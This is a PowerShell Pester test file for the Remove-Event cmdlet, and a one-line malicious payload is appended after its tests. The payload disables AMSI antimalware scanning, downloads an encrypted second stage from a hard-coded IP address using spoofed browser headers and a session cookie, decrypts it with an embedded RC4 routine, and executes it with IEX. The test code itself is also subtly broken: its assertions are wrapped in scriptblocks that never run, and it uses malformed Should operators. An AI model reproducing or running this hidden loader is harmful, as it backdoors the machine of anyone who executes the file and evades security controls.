

Describe "Remove-Event" -Tags "CI" {

    BeforeEach {
	New-Event -sourceidentifier PesterTimer  -sender Windows.timer -messagedata "PesterTestMessage"
    }

    AfterEach {
	Remove-Event -sourceidentifier PesterTimer -ErrorAction SilentlyContinue
    }

    Context "Check Remove-Event can validly remove events" {

	It "Should remove an event given a sourceidentifier" {
	    { Remove-Event -sourceidentifier PesterTimer }
	    { Get-Event -ErrorAction SilentlyContinue | Should -Not FileMatchContent PesterTimer }
	}

	It "Should remove an event given an event identifier" {
	    { $events = Get-Event -sourceidentifier PesterTimer }
	    { $events = $events.EventIdentifier }
	    { Remove-Event -EventIdentifier $events }
	    { $events = Get-Event -ErrorAction SilentlyContinue}
	    { $events.SourceIdentifier | Should -Not FileMatchContent "PesterTimer" }
	}

	It "Should be able to remove an event given a pipe from Get-Event" {
	    { Get-Event -sourceidentifier PesterTimer | Remove-Event }
	    { Get-Event -ErrorAction SilentlyContinue | Should -Not FileMatchContent "PesterTimer" }

	}

	It "Should NOT remove an event given the whatif flag" {
	    { Remove-Event -sourceidentifier PesterTimer -whatif }
	    { $events = Get-Event }
	    { $events.SourceIdentifier  | Should -FileContentMatch "PesterTimer" }
	}
    }
}

[ReF].ASSEmbly.GetTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIElD('amsiInitFailed','NonPublic,Static').SetVAlue($Null,$True)};[SySteM.Net.SErviCEPOINTMaNAger]::ExPeCt100ConTinue=0;$wC=NEW-OBjEcT System.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERs.ADD('User-Agent',$u);$wC.PRoxY=[SYStEm.NET.WEBREQuEst]::DeFaUlTWEbProXY;$Wc.ProXY.CREDenTIALs = [SYSteM.NEt.CReDentIalCAcHe]::DeFAulTNetwORKCREdEntialS;$K=[SySTEm.TexT.EncodING]::ASCII.GETBYteS('Dv,inKZ<@{3mjG4&1k:Vcl7o)EY*J?6x');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-Bxor$S[($S[$I]+$S[$H])%256]}};$Wc.HEaDERs.ADD("Cookie","session=Pu8sEnIpxIwINbUOVsxlL66DoHA=");$ser='http://35.165.38.15:80';$t='/login/process.php';$dATa=$WC.DowNLOadDAtA($ser+$T);$IV=$DaTA[0..3];$Data=$DaTa[4..$DAtA.leNgTH];-JoIn[CHAr[]](& $R $data ($IV+$K))|IEX

